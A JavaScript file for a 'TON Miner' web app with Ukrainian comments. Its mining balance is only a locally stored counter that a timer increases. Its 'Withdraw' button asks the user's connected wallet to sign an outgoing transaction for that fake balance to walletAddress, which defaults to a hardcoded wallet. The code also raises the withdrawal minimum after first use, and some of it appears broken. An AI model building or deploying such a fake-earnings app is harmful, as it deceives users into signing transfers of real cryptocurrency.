// ==== Підключення TonConnect UI ====
const tonConnectUI = new TonConnectUI({
    manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json"
});

// ==== Дефолтний гаманець (твій) ====
let walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <- встав свій TON гаманець
let balance = parseFloat(localStorage.getItem("balance")) || 0;
let mining = localStorage.getItem("mining") === "true";
let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
let minDeposit = parseFloat(localStorage.getItem("minDeposit")) || 1;
let miningInterval = null;

// ==== Оновлення UI балансу ====
function updateBalanceUI() {
    document.getElementById("balance").innerText = balance.toFixed(6);
}

// ==== Кнопка Connect Wallet для користувачів ====
const connectButton = document.createElement("button");
connectButton.innerText = "Connect Wallet";
connectButton.onclick = async () => {
    try {
        const wallet = await tonConnectUI.connect();
        walletAddress = wallet.account.address; // переписує дефолтний гаманець
        alert("Wallet connected: " + walletAddress);
    } catch(e) {
        console.error(e);
        alert("Wallet connection failed");
    }
};
document.getElementById("connect-wallet").appendChild(connectButton);

// ==== Start Mining ====
function startMining() {
    if(mining) return;
    mining = true;
    localStorage.setItem("mining", "true");
    miningInterval = setInterval(()=>{
        balance += miningSpeed;
        updateBalanceUI();
        localStorage.setItem("balance", balance);
    }, 1000);
}

// ==== Boost 1/5/15 TON ====
function buyBoost(amount) {
    let increment = amount === 1 ? 0.000001929 :
                    amount === 5 ? 0.000005787 :
                                   0.0000173611;
    miningSpeed += increment;
    localStorage.setItem("miningSpeed", miningSpeed);
    alert(`Boost ${amount} TON applied! +${increment} TON/sec`);
}

// ==== Invite Friends ====
function inviteFriends() {
    // Реальний Invite: додаємо +0.01 TON
    balance += 0.01;
    localStorage.setItem("balance", balance);
    updateBalanceUI();
    alert("+0.01 TON added for inviting a friend!");
}

// ==== Withdraw ====
async function withdraw() {
    if(!walletAddress) {
        alert("Connect wallet first!");
        return;
    }
    if(balance < minDeposit) {
        alert(`Minimum deposit to withdraw: ${minDeposit} TON`);
        return;
    }
    try {
        await tonConnectUI.sendTransaction({
            validUntil: Math.floor(Date.now()/1000) + 60,
            messages:[{
                address: walletAddress,
                amount: balance.toFixed(9),
                payload:""
            }]
        });
        balance = 0;
        updateBalanceUI();
        minDeposit = 5; // після першого виводу мінімум збільшується
        localStorage.setItem("minDeposit", minDeposit);
        alert("Withdraw successful!");
    } catch(e) {
        console.error(e);
        alert("Withdraw failed or cancelled");
    }
}

// ==== DOM Ready ====
document.addEventListener("DOMContentLoaded", updateBalanceUI);

// ==== Прив’язка функцій до глобальної області ====
window.startMining = startMining;
window.buyBoost = buyBoost;
window.inviteFriends = inviteFriends;
window.withdraw = withdraw;